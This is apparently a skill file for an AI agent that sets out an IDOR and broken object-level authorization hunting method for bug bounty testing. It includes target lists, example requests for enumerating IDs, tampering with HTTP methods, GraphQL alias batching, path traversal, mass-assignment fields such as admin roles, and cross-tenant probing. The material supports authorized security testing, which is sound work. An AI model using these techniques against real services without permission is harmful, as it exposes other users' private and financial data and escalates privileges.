---
name: hunt-idor
description: |
  Insecure Direct Object References (IDOR) / Broken Object Level Authorization
  hunting methodology. 26+ HackerOne disclosed report patterns. Horizontal and
  vertical privilege escalation, mass assignment, parameter pollution, UUID
  enumeration, cross-tenant access.
triggers:
  - hunt idor
  - test for idor
  - insecure direct object reference
  - broken access control
  - horizontal privilege escalation
  - vertical privilege escalation
  - object level authorization
category: security
---
# IDOR / Broken Object Level Authorization Hunting

Adapted from Claude-BugHunter by ElementalSouls.  
**Source:** 26+ public HackerOne reports, OWASP API Security Top 10 (#1 BOLA).

---

## Core Principle

> **"If the server trusts the client to tell it which object to access, and doesn't verify the client is authorized to access that object, you have an IDOR."**

---

## Crown Jewel Targets

| Target Type | Why High Value |
|---|---|
| **User profile/settings APIs** | View or modify any user's personal data, PII |
| **Order/invoice/transaction endpoints** | Read financial data, refund/change orders |
| **Document/message/file access** | Read private documents, messages between users |
| **Admin APIs with numeric IDs** | Escalate from user to admin-level access |
| **Multi-tenant SaaS APIs** | Cross-tenant data access — one tenant reads another's data |
| **Beta feature endpoints** | Less tested, often missing auth checks |
| **Webhook/notification settings** | Modify another user's notification preferences or webhook URLs |
| **Payment/membership APIs** | Downgrade/upgrade others' subscriptions |

---

## Attack Methodology

### Step 1: Enumerate Object References

Identify ALL object references in the application:

- **Numeric IDs**: `/api/user/123`, `/invoice?id=456`
- **UUIDs**: `/api/order/a1b2c3d4-...`
- **Usernames/emails**: `/profile/john.doe`, `/api/user?email=user@test.com`
- **File paths**: `/download?file=report_123.pdf`
- **Document keys**: `/view?doc=abc123`
- **GraphQL node IDs**: Base64-encoded `"User:123"`
- **Sequential tokens**: Password reset tokens, invitation codes, share links

### Step 2: Test Horizontal Escalation

For each object reference, try accessing another user's object:

```bash
# Numeric ID: increment/decrement
GET /api/user/123/profile
GET /api/user/124/profile
GET /api/user/122/profile

# UUID: check for sequential or time-based patterns
GET /api/orders/a1b2c3d4-e5f6-...
GET /api/orders/a1b2c3d4-e5f6-...+1

# Username: try common or predictable patterns
GET /api/user/admin/profile
GET /api/user/support/profile
```

### Step 3: Test Vertical Escalation

Try accessing admin-level or privileged objects as a regular user:

```bash
# Admin endpoints
GET /api/admin/users/123
GET /api/admin/settings
GET /api/internal/users/123

# Try with regular user's session token
```
### Step 4: Test HTTP Method Tampering

If GET is protected, try other methods:

```bash
# Read (if GET blocked)
HEAD /api/user/123/profile
OPTIONS /api/user/123/profile

# Modify (if only GET protected)
PUT /api/user/123/profile
DELETE /api/user/123/profile
PATCH /api/user/123/profile
```

### Step 5: Test Parameter Manipulation

```bash
# Add or change parameters
GET /api/orders/456?user_id=123    # try user_id=124
GET /api/orders/456?admin=true
POST /api/orders {"user_id": 123, "order_id": 456}

# Array/object parameter
GET /api/orders?id[]=456
GET /api/orders?id=456&id=789
```

---

## IDOR Pattern Library (26+ Disclosed Report Patterns)

### Pattern 1: Simple Numeric ID in URL Path
```
GET /api/v1/users/123/profile
→ Try 124, 122, 1, 0
```
**Validation:** Two accounts. Account A (ID 123) can access Account B's data (ID 124).

### Pattern 2: UUID in URL — Sequential or Predictable
```
GET /api/documents/d7e8f1a2-b3c4-5d6e-7f8a-9b0c1d2e3f4a
```
**Test:**  
- Are UUIDs time-based (v1) predictable if you know the timestamp?
- Can you enumerate by fetching many and checking for sequential patterns?
- Is the UUID reused from another predictable context (email hash, user ID hash)?

### Pattern 3: ID in Request Body
```json
POST /api/orders/cancel
{"order_id": 456}
→ Try 457, 458
```
**Test:** Same as URL ID but in POST body, JSON, XML, or form data.

### Pattern 4: ID in Cookie / Header
```
Cookie: user_id=123
X-User-Id: 123
```
**Test:** Modify the header/cookie value.

### Pattern 5: Old API Version Bypass
```
/v3/users/123/profile → 403
/v1/users/123/profile → 200 (less strict auth)
```
**Test:** Downgrade API version to find less-protected endpoints.

### Pattern 6: UUID or Token in Base64
```
/v2/documents/eyJ1c2VyX2lkIjogMTIzLCAiZG9jX2lkIjogNDU2fQ==
```
**Test:** Decode the Base64 — does it contain an object reference you can modify?

### Pattern 7: Wildcard or Mass ID Access
```
GET /api/users
GET /api/users/all
GET /api/users/export
GET /api/users/?
GET /api/users/*
```
**Test:** Try endpoints that return collections without specifying an ID.

### Pattern 8: GraphQL Batching / Alias Attack
```graphql
query {
  user(id: 123) { email, ssn }
  user(id: 124) { email, ssn }
  user(id: 125) { email, ssn }
}
```
**Test:** Use GraphQL aliases to batch-read multiple user records in one query.

### Pattern 9: Indirect Object Reference via File/Path
```
/download?file=invoice_123.pdf
→ Try invoice_124.pdf, ../invoice_123.pdf
/download?file=user_123_report.pdf
→ Try user_124_report.pdf
```
**Test:** Path traversal combined with ID enumeration.

### Pattern 10: WebSocket IDOR
```
ws://target.com/ws/chat?user_id=123
→ Try user_id=124
```
**Test:** WebSocket connections often skip REST-style auth checks.

---

## UUID Enumeration Techniques

### Check UUID Version
```bash
# Decode UUID version bits
uuid="a1b2c3d4-e5f6-4710-a123-456789abcdef"
version=$((16#${uuid:14:1}))  # Should be 1, 3, 4, or 5
echo "UUID version: $version"
```

- **v1** — Time-based, can be predicted if you know the timestamp
- **v4** — Random (usually not predictable, but check for sequential patterns)
- **v3/v5** — Hash-based (predictable if based on known inputs)

### UUID v1 Prediction
If the UUID is v1, it contains a timestamp. If you can register two accounts close together, their UUIDs reveal the generation rate — you can enumerate all users created in a time window.

---

## Mass Assignment / Auto-Binding

Look for endpoints where you can pass extra fields:

```json
// Registration endpoint
POST /api/register
{"username": "test", "password": "pass123", "role": "admin"}

// Profile update
PUT /api/user/123/profile
{"name": "new name", "is_admin": true, "credits": 999999}

// Add extra fields
{"email": "test@test.com", "admin": true, "account_type": "premium"}
```

### Common Mass Assignment Fields
- `role`, `is_admin`, `admin`, `user_type`, `account_type`
- `is_verified`, `email_verified`, `is_premium`
- `credits`, `balance`, `tokens`
- `id`, `user_id`, `owner_id`
- `permissions`, `scopes`, `groups`

---

## Cross-Tenant IDOR (SaaS-Specific)

For multi-tenant SaaS applications:

```bash
# Switch tenant ID in request
GET /api/tenant/acme-corp/orders
→ Try /api/tenant/competitor-inc/orders

# Check if tenant ID is inferred from session or can be overridden
GET /api/orders
X-Tenant-Id: competitor-inc

# Check subdomain-based tenancy
acme.targeapp.com/api/users
→ Try competitor.targetapp.com/api/users
```

---

## Validation Checklist

Before reporting an IDOR:

- [ ] Confirmed with TWO test accounts (attacker Account A accesses Account B's data)
- [ ] Demonstrated actual other-user data in response (PII, orders, documents), not just a 200 status
- [ ] Tested both GET and other HTTP methods on the same endpoint
- [ ] Checked if the same IDOR exists on related endpoints (siblings)
- [ ] Verified the accessed data isn't already public (check incognito session)
- [ ] For modification IDOR: confirmed the change persisted after refresh
- [ ] For UUID: documented whether enumeration is practical
- [ ] Impact clearly quantified: "Attacker can read X records of type Y belonging to any user"
